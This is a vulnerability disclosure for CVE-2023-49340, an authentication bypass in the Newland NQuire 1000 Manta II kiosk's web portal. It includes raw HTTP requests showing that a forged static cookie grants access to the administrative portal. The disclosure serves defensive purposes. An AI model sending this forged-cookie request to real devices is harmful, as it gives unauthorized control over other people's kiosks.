## Disclosure of CVE-2023-49340: Improper Authorization in web management portal leads authentication bypass

**CVE ID:** CVE-2023-49340 <br>
**Researcher:** n0obit4 (Mr.EAX) <br>
**Vendor:** Newland EMEA <br>
**Product:** NQuire 1000 Manta II <br>
**Version:** NQ1000-II_G_V1.00.011

### Description:
An `improper access control` vulnerability was discovered in `Newland Nquire 1000` Interactive Kiosk. This vulnerability enables an unauthenticated actor to `bypass the login` process, gaining unauthorized access to the administrative portal and allowing the execution of privileged actions.

**Tested on:** NQuire 1000 Manta II firmware == NQ1000-II_G_V1.00.011

### Details:
On successful login, a cookie is returned with the following value `Token: 12345678`, this key-pair value is used as session token to identify a logged-on users on the web application.

The **key-pair value is static and is not properly verified by the web application**, allowing an adversary to forge a cookie (e.g `Cookie: Token: n0obit4`) to gain full control over the management portal and perform privileged actions.

### Steps to reproduce:

In the following proof of concept i'll perform a request without session cookie and other with a random cookie.

**Normal flow without authentication**

**Request:**

```
GET /log.htm HTTP/1.1
Host: 192.168.3.216
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b2;q=0.7
Referer: http://192.168.3.216/left.htm
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
If-None-Match: 1f7bbba0
Connection: close

```

**Response**

![](images/web_login.png)

**Authentication bypass**

**Request**

```
GET /log.htm HTTP/1.1
Host: 192.168.3.216
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b2;q=0.7
Referer: http://192.168.3.216/left.htm
Accept-Encoding: gzip, deflate

Cookie: Token: n0obit4

Accept-Language: en-US,en;q=0.9
If-None-Match: 1f7bbba0
```

**Response**


![](images/web_mgmt_portal.png)

### References:
- [CWE-1390: Weak Authentication](https://cwe.mitre.org/data/definitions/1390.html)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [NQuire 1000 Manta II](https://www.newland-id.com/sites/default/files/documents/2022-02/Newland_NQuire1000_Manta_2_product-update.pdf)
